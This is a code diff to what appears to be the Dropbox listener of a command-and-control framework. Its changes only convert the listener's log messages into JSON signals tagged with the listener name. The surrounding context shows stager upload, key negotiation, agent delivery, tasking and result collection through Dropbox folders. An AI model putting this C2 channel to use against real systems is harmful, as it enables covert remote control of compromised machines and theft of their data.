@@ -3,6 +3,7 @@ import random
 import os
 import time
 import copy
+import json
 import dropbox
 # from dropbox.exceptions import ApiError, AuthError
 # from dropbox.files import FileMetadata, FolderMetadata, CreateFolderError
@@ -801,7 +802,14 @@ def send_message(packets=None):
             try:
                 md, res = dbx.files_download(path)
             except dropbox.exceptions.HttpError as err:
-                dispatcher.send("[!] Error download data from '%s' : %s" % (path, err), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[!] Error downloading data from '{}' : {}".format(path, err)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+
                 return None
             return res.content
 
@@ -810,14 +818,26 @@ def send_message(packets=None):
             try:
                 dbx.files_upload(data, path)
             except dropbox.exceptions.ApiError:
-                dispatcher.send("[!] Error uploading data to '%s'" % (path), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[!] Error uploading data to '{}'".format(path)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
         def delete_file(dbx, path):
             # helper to delete a file at the given path
             try:
                 dbx.files_delete(path)
             except dropbox.exceptions.ApiError:
-                dispatcher.send("[!] Error deleting data at '%s'" % (path), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[!] Error deleting data at '{}'".format(path)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
 
         # make a copy of the currently set listener options for later stager/agent generation
@@ -845,15 +865,33 @@ def send_message(packets=None):
         try:
             dbx.files_create_folder(stagingFolder)
         except dropbox.exceptions.ApiError:
-            dispatcher.send("[*] Dropbox folder '%s' already exists" % (stagingFolder), sender="listeners/dropbox")
+            listenerName = self.options['Name']['Value']
+            message = "[*] Dropbox folder '{}' already exists".format(stagingFolder)
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
         try:
             dbx.files_create_folder(taskingsFolder)
         except dropbox.exceptions.ApiError:
-            dispatcher.send("[*] Dropbox folder '%s' already exists" % (taskingsFolder), sender="listeners/dropbox")
+            listenerName = self.options['Name']['Value']
+            message = "[*] Dropbox folder '{}' already exists".format(taskingsFolder)
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
         try:
             dbx.files_create_folder(resultsFolder)
         except dropbox.exceptions.ApiError:
-            dispatcher.send("[*] Dropbox folder '%s' already exists" % (resultsFolder), sender="listeners/dropbox")
+            listenerName = self.options['Name']['Value']
+            message = "[*] Dropbox folder '{}' already exists".format(resultsFolder)
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
         # upload the stager.ps1 code
         stagerCodeps = self.generate_stager(listenerOptions=listenerOptions, language='powershell')
@@ -884,7 +922,13 @@ def send_message(packets=None):
                         try:
                             md, res = dbx.files_download(fileName)
                         except dropbox.exceptions.HttpError as err:
-                            dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
+                            listenerName = self.options['Name']['Value']
+                            message = "[!] Error downloading data from '{}' : {}".format(fileName, err)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                             continue
                         stageData = res.content
 
@@ -895,19 +939,43 @@ def send_message(packets=None):
                                 try:
                                     dbx.files_delete(fileName)
                                 except dropbox.exceptions.ApiError:
-                                    dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[!] Error deleting data at '{}'".format(fileName)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                                 try:
                                     stageName = "%s/%s_2.txt" % (stagingFolder, sessionID)
-                                    dispatcher.send("[*] Uploading key negotiation part 2 to %s for %s" % (stageName, sessionID), sender='listeners/dbx')
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[*] Uploading key negotiation part 2 to {} for {}".format(stageName, sessionID)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                                     dbx.files_upload(results, stageName)
                                 except dropbox.exceptions.ApiError:
-                                    dispatcher.send("[!] Error uploading data to '%s'" % (stageName), sender="listeners/dropbox")
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[!] Error uploading data to '{}'".format(stageName)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                     if stage == '3':
                         try:
                             md, res = dbx.files_download(fileName)
                         except dropbox.exceptions.HttpError as err:
-                            dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
+                            listenerName = self.options['Name']['Value']
+                            message = "[!] Error downloading data from '{}' : {}".format(fileName, err)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                             continue
                         stageData = res.content
 
@@ -917,18 +985,36 @@ def send_message(packets=None):
                             for (language, results) in dataResults:
                                 if results.startswith('STAGE2'):
                                     sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
-                                    dispatcher.send("[*] Sending agent (stage 2) to %s through Dropbox" % (sessionID), sender='listeners/dbx')
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[*] Sending agent (stage 2) to {} through Dropbox".format(sessionID)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                                     try:
                                         dbx.files_delete(fileName)
                                     except dropbox.exceptions.ApiError:
-                                        dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[!] Error deleting data at '{}'".format(fileName)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                                     try:
                                         fileName2 = fileName.replace("%s_3.txt" % (sessionID), "%s_2.txt" % (sessionID))
                                         dbx.files_delete(fileName2)
                                     except dropbox.exceptions.ApiError:
-                                        dispatcher.send("[!] Error deleting data at '%s'" % (fileName2), sender="listeners/dropbox")
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[!] Error deleting data at '{}'".format(fileName2)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                                     # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                                     agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
@@ -936,10 +1022,22 @@ def send_message(packets=None):
 
                                     try:
                                         stageName = "%s/%s_4.txt" % (stagingFolder, sessionID)
-                                        dispatcher.send("[*] Uploading key negotiation part 4 (agent) to %s for %s" % (stageName, sessionID), sender='listeners/dbx')
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[*] Uploading key negotiation part 4 (agent) to {} for {}".format(stageName, sessionID)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                                         dbx.files_upload(returnResults, stageName)
                                     except dropbox.exceptions.ApiError:
-                                        dispatcher.send("[!] Error uploading data to '%s'" % (stageName), sender="listeners/dropbox")
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[!] Error uploading data to '{}'".format(stageName)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
 
             # get any taskings applicable for agents linked to this listener
@@ -961,22 +1059,47 @@ def send_message(packets=None):
                         if existingData:
                             taskingData = taskingData + existingData
 
-                        dispatcher.send("[*] Uploading agent tasks for %s to %s" % (sessionID, taskingFile), sender='listeners/dbx')
+                        listenerName = self.options['Name']['Value']
+                        message = "[*] Uploading agent tasks for {} to {}".format(sessionID, taskingFile)
+                        signal = json.dumps({
+                            'print': True,
+                            'message': message
+                        })
+                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+
                         dbx.files_upload(taskingData, taskingFile, mode=dropbox.files.WriteMode.overwrite)
                     except dropbox.exceptions.ApiError as e:
-                        dispatcher.send("[!] Error uploading agent tasks for %s to %s : %s" % (sessionID, taskingFile, e), sender="listeners/dropbox")
+                        listenerName = self.options['Name']['Value']
+                        message = "[!] Error uploading agent tasks for {} to {} : {}".format(sessionID, taskingFile, e)
+                        signal = json.dumps({
+                            'print': True,
+                            'message': message
+                        })
+                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
             # check for any results returned
             for match in dbx.files_search(resultsFolder, "*.txt").matches:
                 fileName = str(match.metadata.path_display)
                 sessionID = fileName.split('/')[-1][:-4]
 
-                dispatcher.send("[*] Downloading data for '%s' from %s" % (sessionID, fileName), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[*] Downloading data for '{}' from {}".format(sessionID, fileName)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                 try:
                     md, res = dbx.files_download(fileName)
                 except dropbox.exceptions.HttpError as err:
-                    dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
+                    listenerName = self.options['Name']['Value']
+                    message = "[!] Error download data from '{}' : {}".format(fileName, err)
+                    signal = json.dumps({
+                        'print': True,
+                        'message': message
+                    })
+                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                     continue
 
                 responseData = res.content
@@ -984,7 +1107,13 @@ def send_message(packets=None):
                 try:
                     dbx.files_delete(fileName)
                 except dropbox.exceptions.ApiError:
-                    dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
+                    listenerName = self.options['Name']['Value']
+                    message = "[!] Error deleting data at '{}'".format(fileName)
+                    signal = json.dumps({
+                        'print': True,
+                        'message': message
+                    })
+                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                 self.mainMenu.agents.handle_agent_data(stagingKey, responseData, listenerOptions)
 
